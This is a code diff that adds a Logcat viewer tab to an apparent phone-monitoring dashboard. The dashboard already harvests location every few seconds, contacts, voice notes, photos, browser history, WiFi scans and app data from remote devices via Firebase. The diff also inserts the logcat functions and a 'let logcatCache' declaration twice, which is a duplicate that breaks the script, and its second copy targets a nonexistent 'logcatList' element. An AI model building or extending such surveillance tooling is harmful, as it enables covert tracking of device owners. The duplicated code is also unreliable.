@@ -223,6 +223,7 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 <button class="tab-btn" data-tab="browser">&#x1F310; Browser</button>
 <button class="tab-btn" data-tab="permissions">&#x1F512; Perms</button>
 <button class="tab-btn" data-tab="wifi">&#x1F4E1; WiFi</button>
+<button class="tab-btn" data-tab="logcat">&#x1F4DD; Logcat</button>
 </div>
 <div class="content" id="tabContent">
 <div class="active" id="tab-live">
@@ -380,6 +381,27 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 <input type="text" id="wifiSearch" placeholder="&#x1F50D; Filter by SSID or BSSID..." style="width:100%;padding:8px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);font-size:12px;margin-bottom:8px">
 <div id="wifiList"><div class="label">No WiFi scan data yet</div></div>
 </div>
+<div id="tab-logcat">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:4px">
+<span style="font-size:14px;font-weight:500">&#x1F4DD; Logcat</span>
+<div style="display:flex;gap:6px">
+<span class="chip" style="background:var(--accent);color:#000;font-size:11px;cursor:pointer" onclick="pollLogcat()">&#x1F504; Refresh</span>
+<span class="chip" style="background:var(--accent);color:#000;font-size:11px;cursor:pointer" onclick="clearLogcat()">&#x1F5D1; Clear</span>
+</div>
+</div>
+<div style="display:flex;gap:8px;margin-bottom:8px;flex-wrap:wrap">
+<select id="logcatFilter" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:6px 8px;border-radius:6px;font-size:11px">
+<option value="">All</option>
+<option value="E">Errors only</option>
+<option value="W">Warnings</option>
+<option value="D">Debug</option>
+<option value="I">Info</option>
+<option value="V">Verbose</option>
+</select>
+<input type="text" id="logcatSearch" placeholder="&#x1F50D; Search..." style="flex:1;min-width:150px;padding:6px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:6px;font-size:11px">
+</div>
+<div id="logcatContent" style="font-family:monospace;font-size:10px;line-height:1.4;max-height:60vh;overflow-y:auto;background:#0d1117;padding:8px;border-radius:6px;border:1px solid var(--border)"><div class="label" style="color:var(--muted)">Click Refresh to load logcat</div></div>
+</div>
 <div id="tab-playback">
 <div class="pb-stats" id="pbStats" style="display:none">
 <div class="card" style="border-left-color:var(--accent);padding:10px 14px">
@@ -513,7 +535,7 @@ let playbackLoop = false;
 
 // --- Poll Timers ---
 let pollTimers = [];
-const BASE_INTERVALS = { loc: 3000, hist: 600000, meta: 30000, apps: 300000, voice: 300000, fcm: 60000, contacts: 3600000, perms: 3600000 };
+const BASE_INTERVALS = { loc: 3000, hist: 600000, meta: 30000, apps: 300000, voice: 300000, fcm: 60000, contacts: 3600000, perms: 3600000, logcat: 300000 };
 let intervals = { ...BASE_INTERVALS };
 
 // --- Init Map ---
@@ -781,6 +803,7 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
     if (btn.dataset.tab === 'permissions') { if (window.permCache) renderPermissions(); else pollPermissions(); }
     if (btn.dataset.tab === 'photos') pollPhotos();
     if (btn.dataset.tab === 'wifi') pollWifiScans();
+    if (btn.dataset.tab === 'logcat') pollLogcat();
   });
 });
 
@@ -810,6 +833,7 @@ document.getElementById('deviceSelect').addEventListener('change', function() {
   contactsCache = null;
   contactsSyncTs = 0;
   wifiCache = [];
+  logcatCache = [];
   window.permCache = null;
   window.permLastSync = 0;
   if (trail) { map.removeLayer(trail); trail = null; }
@@ -848,6 +872,7 @@ function startPolling() {
   schedulePoll('browser', 120000, pollBrowserHistory);
   schedulePoll('insights', 120000, renderInsights);
   schedulePoll('wifi', 60000, pollWifiScans);
+  schedulePoll('logcat', 60000, pollLogcat);
 }
 
 function schedulePoll(name, interval, fn) {
@@ -859,7 +884,7 @@ function schedulePoll(name, interval, fn) {
 }
 
 async function pollAll() {
-  const fns = [pollLocation(), pollMeta(), pollApps(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollContacts(), pollFcmToken(), pollQueueSize(), pollBrowserHistory(), pollPermissions(), pollWifiScans()];
+  const fns = [pollLocation(), pollMeta(), pollApps(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollContacts(), pollFcmToken(), pollQueueSize(), pollBrowserHistory(), pollPermissions(), pollWifiScans(), pollLogcat()];
   for (const fn of fns) { try { await fn; } catch {} }
 }
 
@@ -2872,6 +2897,68 @@ async function pollWifiScans() {
   renderWifiScans();
 }
 
+// --- Logcat ---
+let logcatCache = [];
+
+async function pollLogcat() {
+  if (!selectedDevice) return;
+  const data = await fetchRTDB(`devices/${selectedDevice}/logcat`);
+  if (!data || typeof data !== 'object') {
+    logcatCache = [];
+    return;
+  }
+  logcatCache = Object.entries(data)
+    .map(([ts, val]) => ({
+      ts: parseInt(ts),
+      logcat: val.logcat || '',
+      lines: val.lines || 0
+    }))
+    .filter(s => s.ts && s.logcat)
+    .sort((a, b) => b.ts - a.ts)
+    .slice(0, 50);
+  renderLogcat();
+}
+
+function renderLogcat() {
+  const list = document.getElementById('logcatContent');
+  const filter = document.getElementById('logcatFilter').value;
+  const query = (document.getElementById('logcatSearch').value || '').toLowerCase();
+  if (!logcatCache.length) {
+    list.innerHTML = '<div class="label">No logcat data yet</div>';
+    return;
+  }
+  let html = '';
+  for (const entry of logcatCache) {
+    let lines = entry.logcat.split('\n');
+    // Filter by log level
+    if (filter) {
+      const prefix = ' ' + filter + '/';
+      lines = lines.filter(l => l.includes(prefix));
+    }
+    if (query) {
+      lines = lines.filter(l => l.toLowerCase().includes(query));
+    }
+    lines = lines.slice(0, 200);
+    if (!lines.length && (filter || query)) continue;
+    html += `<div class="card" style="padding:10px 14px;margin-bottom:4px">
+      <div style="display:flex;justify-content:space-between;flex-wrap:wrap;gap:4px;margin-bottom:6px">
+        <span style="font-size:12px;color:var(--muted)">${pkt(entry.ts)}</span>
+        <span style="font-size:11px;color:var(--muted)">${lines.length}/${entry.lines} lines</span>
+      </div>
+      <pre style="font-family:monospace;font-size:10px;color:var(--text);white-space:pre-wrap;overflow-x:auto;max-height:300px">${escHtml(lines.join('\n'))}</pre>
+    </div>`;
+  }
+  list.innerHTML = html || '<div class="label">No logcat matches your search</div>';
+}
+
+function clearLogcat() {
+  logcatCache = [];
+  document.getElementById('logcatContent').innerHTML = '<div class="label" style="color:var(--muted)">Logcat cleared</div>';
+}
+
+document.getElementById('logcatFilter')?.addEventListener('change', renderLogcat);
+document.getElementById('logcatSearch')?.addEventListener('input', renderLogcat);
+
 function renderWifiScans() {
   const list = document.getElementById('wifiList');
   const query = (document.getElementById('wifiSearch').value || '').toLowerCase();
@@ -2943,6 +3030,53 @@ function toggleWifiPrev(id) {
 }
 
 document.getElementById('wifiSearch')?.addEventListener('input', renderWifiScans);
+
+// --- Logcat ---
+let logcatCache = [];
+
+async function pollLogcat() {
+  if (!selectedDevice) return;
+  const data = await fetchRTDB(`devices/${selectedDevice}/logcat`);
+  if (!data || typeof data !== 'object') {
+    logcatCache = [];
+    document.getElementById('logcatList').innerHTML = '<div class="label">No logcat data yet</div>';
+    return;
+  }
+  logcatCache = Object.entries(data)
+    .map(([ts, val]) => ({
+      ts: parseInt(ts),
+      logcat: val.logcat || '',
+      lines: val.lines || 0
+    }))
+    .filter(l => l.ts && l.logcat)
+    .sort((a, b) => b.ts - a.ts)
+    .slice(0, 50);
+  renderLogcat();
+}
+
+function renderLogcat() {
+  const list = document.getElementById('logcatList');
+  const query = (document.getElementById('logcatSearch').value || '').toLowerCase();
+  if (!logcatCache.length) {
+    list.innerHTML = '<div class="label">No logcat data yet</div>';
+    return;
+  }
+  let html = '';
+  for (const entry of logcatCache) {
+    const filteredLines = entry.logcat.split('\n')
+      .filter(line => !query || line.toLowerCase().includes(query))
+      .slice(0, 200);
+    if (!filteredLines.length && query) continue;
+    html += `<div class="card" style="padding:10px 14px;margin-bottom:4px">
+      <div style="display:flex;justify-content:space-between;flex-wrap:wrap;gap:4px;margin-bottom:6px">
+        <span style="font-size:12px;color:var(--muted)">${pkt(entry.ts)}</span>
+        <span style="font-size:11px;color:var(--muted)">${filteredLines.length}/${entry.lines} lines</span>
+      </div>
+      <pre style="font-family:monospace;font-size:10px;color:var(--text);white-space:pre-wrap;overflow-x:auto;max-height:300px">${escHtml(filteredLines.join('\n'))}</pre>
+    </div>`;
+  }
+  list.innerHTML = html || '<div class="label">No logcat matches your search</div>';
+}
 
 // --- Init ---
 async function init() {
